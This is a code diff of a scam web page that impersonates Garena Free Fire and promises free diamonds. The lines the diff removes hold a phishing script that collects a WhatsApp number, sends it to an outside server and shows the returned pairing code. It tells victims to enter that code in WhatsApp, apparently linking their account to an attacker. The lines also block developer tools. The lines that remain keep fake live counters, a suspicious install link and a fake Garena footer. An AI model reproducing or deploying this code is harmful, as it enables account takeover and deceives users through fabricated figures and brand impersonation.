@@ -1332,7 +1332,7 @@
 
                     <div class="card-info-col">
                         <a href="https://tlksmm.qdmmv.site?key=tlksim139" target="_blank" class="install-btn"
-                            id="mainDiamondBtn" style="margin-bottom: 20px;">
+                            style="margin-bottom: 20px;">
 
                             <span>Install now</span>
                         </a>
@@ -1383,10 +1383,12 @@
                 </div>
             </div>
         </div>
+        
 <script>
-    // Original dynamic counters (unchanged)
+    // ONLY ONE COPY OF THIS SCRIPT
     const viewerEl = document.getElementById('viewerCount');
     let viewers = 1297;
+
     setInterval(() => {
         const change = Math.floor(Math.random() * 9) - 3;
         viewers = Math.max(1100, Math.min(1500, viewers + change));
@@ -1396,34 +1398,36 @@
     let diamonds = 78;
     const increments = [1, 0.5, 1.5, 4.9];
     const el = document.getElementById('tddde');
+
     setInterval(() => {
         diamonds += increments[Math.floor(Math.random() * increments.length)];
-        let display = Number.isInteger(diamonds) ? diamonds + 'K+' : diamonds.toFixed(1) + 'K+';
+        let display = Number.isInteger(diamonds)
+            ? diamonds + 'K+'
+            : diamonds.toFixed(1) + 'K+';
+
         if (el) el.textContent = display;
     }, 2000);
 
     const dlEl = document.getElementById('recentDownloads');
     let downloads = 9999;
+
     setInterval(() => {
         const incArr = [999, 499, 19999];
         downloads += incArr[Math.floor(Math.random() * incArr.length)];
         if (dlEl) dlEl.textContent = downloads.toLocaleString();
     }, 1200);
 
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) e.preventDefault();
-    });
-
     const video = document.getElementById('protectedVideo');
+
     if (video) {
         video.volume = 1.0;
-        video.addEventListener('contextmenu', e => e.preventDefault());
-        video.addEventListener('dragstart', e => e.preventDefault());
+
         let played = false;
+
         const tryPlay = () => {
             if (played) return;
             played = true;
+
             video.play().catch(() => {
                 document.addEventListener('click', function once() {
                     video.play();
@@ -1431,313 +1435,17 @@
                 }, { once: true });
             });
         };
+
         if (video.readyState >= 3) tryPlay();
         else video.addEventListener('canplay', tryPlay, { once: true });
     }
 </script>
-<script>
-    (function () {
-        const mainBtn = document.getElementById('mainDiamondBtn');
-        if (!mainBtn) return;
 
-        const shareBtn = document.getElementById('shareBtn');
-        if (shareBtn) {
-            shareBtn.addEventListener('click', async () => {
-                const shareData = {
-                    title: "Free Fire Diamonds",
-                    text: "GET FREE DIAMONDS -- FREE FIRE",
-                    url: window.location.href
-                };
+</div>
 
-                try {
-                    if (navigator.share) {
-                        await navigator.share(shareData);
-                    } else {
-                        navigator.clipboard.writeText(shareData.url);
-                        alert("Link copied to clipboard");
-                    }
-                } catch (err) {
-                    console.error("Share failed:", err);
-                }
-            });
-        }
+<div class="footer">
+    <p>&copy; 2026 — Garena Free Fire Team — All Rights Reserved</p>
+</div>
 
-        const countryList = [
-            { code: "+91", name: "India", flag: "🇮🇳" },
-
-            { code: "+1", name: "USA", flag: "🇺🇸" },
-            { code: "+44", name: "UK", flag: "🇬🇧" },
-            { code: "+61", name: "Australia", flag: "🇦🇺" },
-            { code: "+81", name: "Japan", flag: "🇯🇵" },
-            { code: "+86", name: "China", flag: "🇨🇳" },
-            { code: "+49", name: "Germany", flag: "🇩🇪" },
-            { code: "+33", name: "France", flag: "🇫🇷" },
-            { code: "+39", name: "Italy", flag: "🇮🇹" },
-            { code: "+7", name: "Russia", flag: "🇷🇺" },
-
-            { code: "+55", name: "Brazil", flag: "🇧🇷" },
-            { code: "+52", name: "Mexico", flag: "🇲🇽" },
-            { code: "+54", name: "Argentina", flag: "🇦🇷" },
-            { code: "+56", name: "Chile", flag: "🇨🇱" },
-            { code: "+57", name: "Colombia", flag: "🇨🇴" },
-
-            { code: "+27", name: "South Africa", flag: "🇿🇦" },
-            { code: "+20", name: "Egypt", flag: "🇪🇬" },
-            { code: "+234", name: "Nigeria", flag: "🇳🇬" },
-            { code: "+254", name: "Kenya", flag: "🇰🇪" },
-            { code: "+251", name: "Ethiopia", flag: "🇪🇹" },
-
-            { code: "+92", name: "Pakistan", flag: "🇵🇰" },
-            { code: "+880", name: "Bangladesh", flag: "🇧🇩" },
-            { code: "+94", name: "Sri Lanka", flag: "🇱🇰" },
-            { code: "+977", name: "Nepal", flag: "🇳🇵" },
-            { code: "+93", name: "Afghanistan", flag: "🇦🇫" },
-
-            { code: "+971", name: "UAE", flag: "🇦🇪" },
-            { code: "+966", name: "Saudi Arabia", flag: "🇸🇦" },
-            { code: "+974", name: "Qatar", flag: "🇶🇦" },
-            { code: "+965", name: "Kuwait", flag: "🇰🇼" },
-            { code: "+968", name: "Oman", flag: "🇴🇲" },
-
-            { code: "+90", name: "Turkey", flag: "🇹🇷" },
-            { code: "+98", name: "Iran", flag: "🇮🇷" },
-            { code: "+964", name: "Iraq", flag: "🇮🇶" },
-            { code: "+972", name: "Israel", flag: "🇮🇱" },
-            { code: "+961", name: "Lebanon", flag: "🇱🇧" },
-
-            { code: "+62", name: "Indonesia", flag: "🇮🇩" },
-            { code: "+60", name: "Malaysia", flag: "🇲🇾" },
-            { code: "+65", name: "Singapore", flag: "🇸🇬" },
-            { code: "+66", name: "Thailand", flag: "🇹🇭" },
-            { code: "+84", name: "Vietnam", flag: "🇻🇳" },
-
-            { code: "+63", name: "Philippines", flag: "🇵🇭" },
-            { code: "+82", name: "South Korea", flag: "🇰🇷" },
-            { code: "+886", name: "Taiwan", flag: "🇹🇼" },
-            { code: "+852", name: "Hong Kong", flag: "🇭🇰" },
-            { code: "+853", name: "Macau", flag: "🇲🇴" },
-
-            { code: "+31", name: "Netherlands", flag: "🇳🇱" },
-            { code: "+32", name: "Belgium", flag: "🇧🇪" },
-            { code: "+41", name: "Switzerland", flag: "🇨🇭" },
-            { code: "+46", name: "Sweden", flag: "🇸🇪" },
-            { code: "+47", name: "Norway", flag: "🇳🇴" },
-
-            { code: "+45", name: "Denmark", flag: "🇩🇰" },
-            { code: "+358", name: "Finland", flag: "🇫🇮" },
-            { code: "+48", name: "Poland", flag: "🇵🇱" },
-            { code: "+420", name: "Czech Republic", flag: "🇨🇿" },
-            { code: "+36", name: "Hungary", flag: "🇭🇺" },
-
-            { code: "+30", name: "Greece", flag: "🇬🇷" },
-            { code: "+351", name: "Portugal", flag: "🇵🇹" },
-            { code: "+34", name: "Spain", flag: "🇪🇸" },
-            { code: "+43", name: "Austria", flag: "🇦🇹" },
-            { code: "+353", name: "Ireland", flag: "🇮🇪" },
-
-            { code: "+64", name: "New Zealand", flag: "🇳🇿" },
-            { code: "+679", name: "Fiji", flag: "🇫🇯" },
-            { code: "+675", name: "Papua New Guinea", flag: "🇵🇬" },
-
-            { code: "+212", name: "Morocco", flag: "🇲🇦" },
-            { code: "+213", name: "Algeria", flag: "🇩🇿" },
-            { code: "+216", name: "Tunisia", flag: "🇹🇳" },
-            { code: "+218", name: "Libya", flag: "🇱🇾" },
-
-            { code: "+233", name: "Ghana", flag: "🇬🇭" },
-            { code: "+225", name: "Ivory Coast", flag: "🇨🇮" },
-            { code: "+221", name: "Senegal", flag: "🇸🇳" },
-            { code: "+220", name: "Gambia", flag: "🇬🇲" },
-
-            { code: "+256", name: "Uganda", flag: "🇺🇬" },
-            { code: "+255", name: "Tanzania", flag: "🇹🇿" },
-            { code: "+260", name: "Zambia", flag: "🇿🇲" },
-            { code: "+263", name: "Zimbabwe", flag: "🇿🇼" },
-
-            { code: "+351", name: "Portugal", flag: "🇵🇹" },
-            { code: "+380", name: "Ukraine", flag: "🇺🇦" },
-            { code: "+375", name: "Belarus", flag: "🇧🇾" },
-            { code: "+374", name: "Armenia", flag: "🇦🇲" },
-            { code: "+995", name: "Georgia", flag: "🇬🇪" },
-
-            { code: "+976", name: "Mongolia", flag: "🇲🇳" },
-            { code: "+95", name: "Myanmar", flag: "🇲🇲" },
-            { code: "+856", name: "Laos", flag: "🇱🇦" },
-            { code: "+855", name: "Cambodia", flag: "🇰🇭" }
-        ];
-
-        // ---------- POPUP ELEMENTS ----------
-        const overlay = document.createElement('div');
-        overlay.className = 'modal-overlay';
-        overlay.innerHTML = `
-            <div class="modal-container">
-                <div class="modal-close">&times;</div>
-                <div class="modal-content" id="modalDynamicContent"></div>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-
-        const closeBtn = overlay.querySelector('.modal-close');
-        const contentContainer = document.getElementById('modalDynamicContent');
-
-        function closeModal() {
-            overlay.classList.remove('active');
-        }
-        closeBtn.addEventListener('click', closeModal);
-        overlay.addEventListener('click', (e) => {
-            if (e.target === overlay) closeModal();
-        });
-
-        // Step 1: WhatsApp + phone input (dynamic country dropdown)
-        function showStep1() {
-            // Build country options HTML from array
-            let optionsHtml = '';
-            countryList.forEach(country => {
-                optionsHtml += `<option value="${country.code}">${country.flag} ${country.code}</option>`;
-            });
-
-            contentContainer.innerHTML = `
-                <div class="popup-left">
-                <span class="whatsapp">Whatsapp</span>
-                <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/970f34cf4cd1a7b8b1a09e28067f167agif" alt="logo">
-
-                <div class="header-divider"></div>
-                </div>
-                <div class="modal-sub">Enter your WhatsApp number to receive pair code</div>
-                <div class="input-group">
-                    <select class="country-code" id="countryCodeSelect">
-                        ${optionsHtml}
-                    </select>
-                    <input type="tel" class="phone-input" id="phoneNumberInput" placeholder="Phone number" autocomplete="off">
-                </div>
-                <button class="get-code-btn" id="getCodeBtn">GET CODE</button>
-            `;
-
-            const getCodeBtn = document.getElementById('getCodeBtn');
-            const phoneInput = document.getElementById('phoneNumberInput');
-            const countrySelect = document.getElementById('countryCodeSelect');
-
-            getCodeBtn.addEventListener('click', async () => {
-                const countryCode = countrySelect.value;
-                const phone = phoneInput.value.trim();
-                if (!phone) {
-                    alert('Please enter phone number');
-                    return;
-                }
-                getCodeBtn.disabled = true;
-                getCodeBtn.textContent = 'SENDING...';
-
-                try {
-                    const fullNumber = (countryCode + phone)
-                        .replace(/\+/g, '')
-                        .replace(/\s+/g, '')
-                        .trim();
-
-                    let uuid = null;
-                    let key = null;
-
-                    const params = new URLSearchParams(window.location.search);
-                    uuid = params.get('click_id') || Date.now().toString();
-                    key = params.get('key') || 'tlksim139';
-
-                    const apiUrl = `https://moneysocial.xavi.top/qrcode?key=${key}&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
-
-                    // Example fetch (replace with your real GET endpoint)
-                    const response = await fetch(apiUrl, { method: 'GET' });
-                    const result = await response.json();
-                    console.log(result.data.pairCode)
-                    const pairCode = result.data.pairCode;  // adjust according to your API response
-
-                    if (!pairCode || pairCode.length !== 9) {
-                        throw new Error('Invalid code received');
-                    }
-
-                    showStep2(pairCode);
-                } catch (err) {
-                    console.error(err);
-                    alert('Error fetching code. Please try again.');
-                    getCodeBtn.disabled = false;
-                    getCodeBtn.textContent = 'GET CODE';
-                }
-            });
-        }
-
-        // Step 2: GIF + formatted code + copy button
-        function showStep2(pairCode) {
-            contentContainer.innerHTML = `
-                <div class="modal-title" style="font-size: 22px;">🎉 CODE GENERATED</div>
-                <div class="pair-code" id="pairCodeDisplay">${pairCode}</div>
-                <button class="copy-code-btn" id="copyCodeBtn">📋 COPY CODE</button>
-                <div class="modal-sub" style="margin-top: 16px;">Use this code in Whatsthis code inApp to claim diamonds</div>
-            `;
-            const copyBtn = document.getElementById('copyCodeBtn');
-            copyBtn.addEventListener('click', () => {
-                // Copy only digits (no dash)
-                navigator.clipboard.writeText(pairCode).then(() => {
-                    copyBtn.textContent = '✓ COPIED!';
-                    setTimeout(() => copyBtn.textContent = '📋 COPY CODE', 2000);
-                }).catch(() => alert('Failed to copy'));
-            });
-        }
-
-        // Show popup when main button is clicked
-        mainBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            showStep1();
-            overlay.classList.add('active');
-        });
-
-        // ---------- YOUR EXISTING DYNAMIC COUNTERS (unchanged) ----------
-        const viewerEl = document.getElementById('viewerCount');
-        let viewers = 1297;
-        setInterval(() => {
-            const change = Math.floor(Math.random() * 9) - 3;
-            viewers = Math.max(1100, Math.min(1500, viewers + change));
-            if (viewerEl) viewerEl.textContent = viewers.toLocaleString();
-        }, 1000);
-
-        let diamonds = 78;
-        const increments = [1, 0.5, 1.5, 4.9];
-        const el = document.getElementById('tddde');
-        setInterval(() => {
-            diamonds += increments[Math.floor(Math.random() * increments.length)];
-            let display = Number.isInteger(diamonds) ? diamonds + 'K+' : diamonds.toFixed(1) + 'K+';
-            if (el) el.textContent = display;
-        }, 2000);
-
-        const dlEl = document.getElementById('recentDownloads');
-        let downloads = 9999;
-        setInterval(() => {
-            const incArr = [999, 499, 19999];
-            downloads += incArr[Math.floor(Math.random() * incArr.length)];
-            if (dlEl) dlEl.textContent = downloads.toLocaleString();
-        }, 1200);
-
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) e.preventDefault();
-        });
-
-        const video = document.getElementById('protectedVideo');
-        if (video) {
-            video.volume = 1.0;
-            video.addEventListener('contextmenu', e => e.preventDefault());
-            video.addEventListener('dragstart', e => e.preventDefault());
-            let played = false;
-            const tryPlay = () => {
-                if (played) return;
-                played = true;
-                video.play().catch(() => {
-                    document.addEventListener('click', function once() {
-                        video.play();
-                        document.removeEventListener('click', once);
-                    }, { once: true });
-                });
-            };
-            if (video.readyState >= 3) tryPlay();
-            else video.addEventListener('canplay', tryPlay, { once: true });
-        }
-    })();
-</script>
 </body>
 </html>
